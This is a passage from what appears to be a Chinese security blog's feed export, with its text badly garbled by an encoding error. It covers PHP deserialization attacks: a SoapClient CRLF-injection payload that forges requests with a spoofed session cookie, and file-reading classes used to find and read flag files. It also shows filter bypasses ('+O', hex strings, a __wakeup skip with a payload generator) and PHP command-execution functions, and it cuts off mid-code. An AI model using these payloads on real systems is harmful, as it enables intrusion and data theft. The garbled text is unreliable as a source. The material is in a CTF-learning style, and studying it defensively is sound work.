in</a></p><blockquote><p>CRLFæ³¨å…¥æ˜¯ä¸€ç±»æ³¨å…¥æ¼æ´ã€‚æ˜¯â€œå›è½¦+æ¢è¡Œâ€çš„ç®€ç§°ï¼Œåˆå«åšå›è½¦æ¢è¡Œç¬¦ã€‚<br>è¡¨ç¤ºä¸º<code>\r\n</code>ï¼Œç¼–ç ä¹‹åæ˜¯<code>%0d%0a</code>ã€‚è¿™ä¸ªåœ¨HTTPåè®®ä¸­è¡¨ç¤ºæ¶ˆæ¯å¤´ä¸æ¶ˆæ¯ä½“ä¹‹é—´çš„åˆ†éš”ã€‚</p><p>æµè§ˆå™¨å°±æ˜¯æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥åˆ†ç¦»HTTPHeaderä¸HTTPBodyçš„ã€‚ä»è€ŒæŠŠHTTPå†…å®¹æ˜¾ç¤ºå‡ºæ¥ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶HTTPæ¶ˆæ¯å¤´çš„å­—ç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¤Ÿæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œã€‚</p></blockquote><p>ä¾‹å­SoapClient::callæ–¹æ³•å‘é€soapè¯·æ±‚,ä¼ªé€ postæ•°æ®</p><p>åœ¨linuxä¸‹æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://192.168.244.128:8888/&quot;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;data=abc&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">  <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;khaz^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Test</span></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">notexists</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="../images/image-20221027114101336.png" alt="image-20221027114101336" style="zoom:67%;" /><p>å› ä¸ºæˆ‘ä»¬è®¾ç½®äº†Content-lengthï¼Œé‚£ä¹ˆè¯»å–äº†data&#x3D;abcåå°±ä¼šèˆå¼ƒæ‰åé¢çš„æ•°æ®</p><h2 id="æ–‡ä»¶æ“ä½œç±»"><a href="#æ–‡ä»¶æ“ä½œç±»" class="headerlink" title="æ–‡ä»¶æ“ä½œç±»"></a>æ–‡ä»¶æ“ä½œç±»</h2><p>æ³¨ï¼šFilesystemIterator æ˜¯DirectoryIteratorçš„å­ç±»ï¼Œæ‰€ä»¥å¯ä»¥å°†DirectoryIteratoræ¢ä¸ºFilesystemIteratorã€‚</p><h4 id="éå†ç›®å½•"><a href="#éå†ç›®å½•" class="headerlink" title="éå†ç›®å½•"></a>éå†ç›®å½•</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;./&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$tmp</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$tmp</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="../images/image-20221128122840348.png" alt="image-20221128122840348" style="zoom:80%;" /><h4 id="æŸ¥æ‰¾æ–‡ä»¶"><a href="#æŸ¥æ‰¾æ–‡ä»¶" class="headerlink" title="æŸ¥æ‰¾æ–‡ä»¶"></a>æŸ¥æ‰¾æ–‡ä»¶</h4><ul><li><p>æŸ¥æ‰¾æ ¹ç›®å½•çš„flagæ–‡ä»¶å</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&quot;f*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128123553510.png" alt="image-20221128123553510"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///f*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20221128123054538.png" alt="image-20221128123054538"></p><blockquote><p>â€‹<strong>GlobIterator ç±»æ”¯æŒç›´æ¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„</strong></p></blockquote><ul><li><p>ç¡®è®¤æ–‡ä»¶è·¯å¾„</p><p>å‡è®¾ç°åœ¨çŸ¥é“flagçš„æ–‡ä»¶åä¸ºflagï¼Œä½†ä¸çŸ¥é“å…·ä½“è·¯å¾„</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># ç›®å½•ç©¿è¶Š</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob://../../../flag&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128123216008.png" alt="image-20221128123216008"></p><p>å½“è¾“å‡ºflagæ—¶ï¼Œè¯´æ˜è·¯å¾„æ˜¯æ­£ç¡®çš„ã€‚</p></li></ul><h4 id="è¯»å–æ–‡ä»¶"><a href="#è¯»å–æ–‡ä»¶" class="headerlink" title="è¯»å–æ–‡ä»¶"></a>è¯»å–æ–‡ä»¶</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f1ag</span>=<span class="title function_ invoke__">implode</span>(<span class="keyword">array</span>(<span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/flag&#x27;</span>)));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$f1ag</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128122206828.png" alt="image-20221128122206828"></p><h1 id="ä¸€äº›ç»•è¿‡trick"><a href="#ä¸€äº›ç»•è¿‡trick" class="headerlink" title="ä¸€äº›ç»•è¿‡trick"></a>ä¸€äº›ç»•è¿‡trick</h1><p><a href="https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#16%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E7%9A%84%E8%BF%87%E6%BB%A4">php(phar)ååºåˆ—åŒ–æ¼æ´åŠå„ç§ç»•è¿‡å§¿åŠ¿</a></p><h3 id="GCæœºåˆ¶ç»•è¿‡æŠ›å‡ºå¼‚å¸¸"><a href="#GCæœºåˆ¶ç»•è¿‡æŠ›å‡ºå¼‚å¸¸" class="headerlink" title="GCæœºåˆ¶ç»•è¿‡æŠ›å‡ºå¼‚å¸¸"></a>GCæœºåˆ¶ç»•è¿‡æŠ›å‡ºå¼‚å¸¸</h3><blockquote><p>æ­£å¸¸æƒ…å†µä¸‹æŠ›å‡ºå¼‚å¸¸å¹¶ä¸”æ²¡æœ‰æ•æ‰çš„è¯phpæ˜¯ä¸ä¼šæ‰§è¡Œææ„å‡½æ•°çš„</p><p>ä½†åœ¨laravelè¿™ç§æ¡†æ¶é‡Œé€šå¸¸éƒ½æœ‰å…¨å±€çš„é”™è¯¯å¤„ç†ä¸å¼‚å¸¸æ•æ‰ï¼Œæ˜¾ç¤ºé€šç”¨çš„500æˆ–è€…é”™è¯¯é¡µé¢ã€‚ åªè¦å¼‚å¸¸è¢«æ•æ‰ï¼Œåé¢çš„ææ„å°±ä¼šæ‰§è¡Œäº†ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="keyword">new</span> test, <span class="literal">null</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;i:1;N&#x27;</span>, <span class="string">&#x27;i:0;N&#x27;</span>, <span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><blockquote><p>å› ä¸º<strong>ååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯é¡ºåºæ‰§è¡Œ</strong>çš„ï¼Œæ‰€ä»¥åˆ°ç¬¬ä¸€ä¸ªå±æ€§æ—¶ï¼Œä¼šå°†<code>Array[0]</code>è®¾ç½®ä¸ºå¯¹è±¡ï¼ŒåŒæ—¶æˆ‘ä»¬åˆå°†<code>Array[0]</code>è®¾ç½®ä¸º<code>null</code>ï¼Œè¿™æ ·å‰é¢çš„<code>test</code>å¯¹è±¡ä¾¿ä¸¢å¤±äº†å¼•ç”¨ï¼Œå°±ä¼šè¢«GCæ‰€æ•è·ï¼Œå°±å¯ä»¥æ‰§è¡Œ<code>__destruct</code>äº†</p></blockquote><h3 id="ç»•è¿‡æ­£åˆ™"><a href="#ç»•è¿‡æ­£åˆ™" class="headerlink" title="ç»•è¿‡æ­£åˆ™"></a>ç»•è¿‡æ­£åˆ™</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;nonono!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><p>ç”¨+Oä»£æ›¿O</p></li><li><p>ç”¨æ•°ç»„ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></li></ul><h3 id="ç»•è¿‡å­—ç¬¦è¿‡æ»¤"><a href="#ç»•è¿‡å­—ç¬¦è¿‡æ»¤" class="headerlink" title="ç»•è¿‡å­—ç¬¦è¿‡æ»¤"></a>ç»•è¿‡å­—ç¬¦è¿‡æ»¤</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/username/&#x27;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;nonono!!!&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>åºåˆ—å­—ç¬¦ä¸²ä¸­<strong>è¡¨ç¤ºå­—ç¬¦ç±»å‹çš„så¤§å†™æ—¶ï¼Œä¼šè¢«å½“æˆ16è¿›åˆ¶è§£æã€‚</strong></p></blockquote><h3 id="ç»•è¿‡wake-up"><a href="#ç»•è¿‡wake-up" class="headerlink" title="ç»•è¿‡wake_up"></a>ç»•è¿‡wake_up</h3><ul><li><strong>phpç‰ˆæœ¬ PHP5&lt;5.6.25ï¼ŒPHP7 &lt; 7.0.10</strong></li></ul><p><strong>ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœè¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶å°±ä¼šè·³è¿‡<code>__wakeup( )</code>çš„æ‰§è¡Œã€‚</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span>= <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Demo</span>);</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$x</span>);<span class="comment">//ç»•è¿‡preg_match()</span></span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:3:&#x27;</span>,<span class="variable">$x</span>);<span class="comment">//ç»•è¿‡__wakeup()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>å¼•ç”¨å˜é‡</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$a</span> = &amp;<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> =<span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221026153815014.png" alt="image-20221026153815014"></p><blockquote><p>åœ¨phpé‡Œ&amp;ç›¸å½“äºä¸¤ä¸ªå˜é‡éƒ½æŒ‡å‘åŒä¸€ä¸ªåœ°å€ï¼Œä¿®æ”¹ä¸€ä¸ªä¼šå½±å“åˆ°å¦ä¸€ä¸ªã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä»»æ„å‘½ä»¤æ‰§è¡Œ</title>
      <link href="/2023/05/31/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2023/05/31/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é»˜è®¤æ— å›æ˜¾</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()å’Œåå¼•å·</span><br><span class="line"><span class="title function_ invoke__">popen</span>()ï¼Œ<span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># é»˜è®¤æœ‰å›æ˜¾</span></span><br><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br></pre></td></tr></table></figure><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">exec</span> ( å‘½ä»¤ï¼Œç»“æœæ•°ç»„ ï¼ŒçŠ¶æ€ç  )</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;whoami&quot;</span>,<span class="variable">$output</span>,<span class="variable">$return_var</span>);</span><br><span class="line"><span class="comment"># é»˜è®¤æ— å›æ˜¾ï¼Œè¦æƒ³è·å¾—ç»“æœï¼Œå°±è¦è¾“å‡ºç¬¬äºŒä¸ªå‚æ•°</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment"># å‘½ä»¤æ‰§è¡ŒæˆåŠŸçš„çŠ¶æ€ç ä¸º0</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$return_var</span>);</span><br></pre></td></tr></table></figure><h3 id="system"><a href="#system" class="headerlink" title="system()"></a><strong>system()</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">system</span> ( å‘½ä»¤, çŠ¶æ€ç  )</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šæ˜¯æ‰§è¡Œäº†<code>sh -c &quot;command&quot;</code>å‘½ä»¤</p><p><strong>system()å‡½æ•°</strong>æ‰§è¡Œæœ‰å›æ˜¾ï¼Œå°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°é¡µé¢ä¸Š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a><strong>passthru()</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void passthru ( å‘½ä»¤, çŠ¶æ€ç   )</span><br></pre></td></tr></table></figure><p>å’Œ<strong>systemå‡½æ•°</strong>ç±»ä¼¼ï¼Œæ‰§è¡Œæœ‰å›æ˜¾ï¼Œå°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°é¡µé¢ä¸Š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="shell-exec-å’Œ-åå¼•å·"><a href="#shell-exec-å’Œ-åå¼•å·" class="headerlink" title="shell_exec()å’Œ åå¼•å·"></a><strong>shell_exec()å’Œ åå¼•å·</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">shell_exec</span>( å‘½ä»¤ )</span><br></pre></td></tr></table></figure><p><strong>shell_exec()å‡½æ•°</strong>é»˜è®¤æ— å›æ˜¾ï¼Œé€šè¿‡ <strong>echo</strong> å¯å°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°é¡µé¢</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>shell_exec() å‡½æ•°å®é™…ä¸Šä»…æ˜¯åæ’‡å· () æ“ä½œç¬¦çš„å˜ä½“ï¼Œå½“ç¦ç”¨shell_execæ—¶ï¼Œ&#96; ä¹Ÿä¸å¯æ‰§è¡Œ</strong></p><p>åå¼•å·åœ¨phpä¸­ç§°ä¹‹ä¸ºæ‰§è¡Œè¿ç®—ç¬¦ï¼ŒPHP å°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    `whoami`;</span><br><span class="line">    <span class="keyword">echo</span> `whoami`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a><strong>popen()</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resource popen ( string $command , string $mode )</span><br></pre></td></tr></table></figure><p>å‡½æ•°éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯æ‰§è¡Œçš„å‘½ä»¤**<code>command</code><strong>ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯æŒ‡é’ˆæ–‡ä»¶çš„è¿æ¥æ¨¡å¼</strong><code>mode</code>**ï¼Œæœ‰<code>r</code>å’Œ<code>w</code>ä»£è¡¨è¯»å’Œå†™ã€‚</p><p>å‡½æ•°ä¸ä¼šç›´æ¥è¿”å›æ‰§è¡Œç»“æœï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆï¼Œä½†æ˜¯å‘½ä»¤å·²ç»æ‰§è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&#x27;ls -l&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;popen() failed\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$line</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="proc-open-å‡½æ•°"><a href="#proc-open-å‡½æ•°" class="headerlink" title="proc_open()å‡½æ•°"></a>proc_open()å‡½æ•°</h3><p>ä¸<code>popen()</code>ç±»ä¼¼ï¼Œåªæ˜¯å¯ä»¥å¼€ä¸¤ä¸ªç®¡é“ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">resource <span class="title function_ invoke__">proc_open</span> ( </span><br><span class="line"><span class="keyword">string</span> <span class="variable">$cmd</span> , </span><br><span class="line"><span class="keyword">array</span> <span class="variable">$descriptorspec</span> , </span><br><span class="line"><span class="keyword">array</span> &amp;<span class="variable">$pipes</span> [, <span class="keyword">string</span> <span class="variable">$cwd</span> [, <span class="keyword">array</span> <span class="variable">$env</span> [, <span class="keyword">array</span> <span class="variable">$other_options</span> ]]] </span><br><span class="line">)</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;ipconfig&quot;</span>;  </span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(  </span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//æ ‡å‡†è¾“å…¥ </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//æ ‡å‡†è¾“å‡ºå†…å®¹ </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)    <span class="comment">//æ ‡å‡†è¾“å‡ºé”™è¯¯ </span></span><br><span class="line"> );  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$test</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span 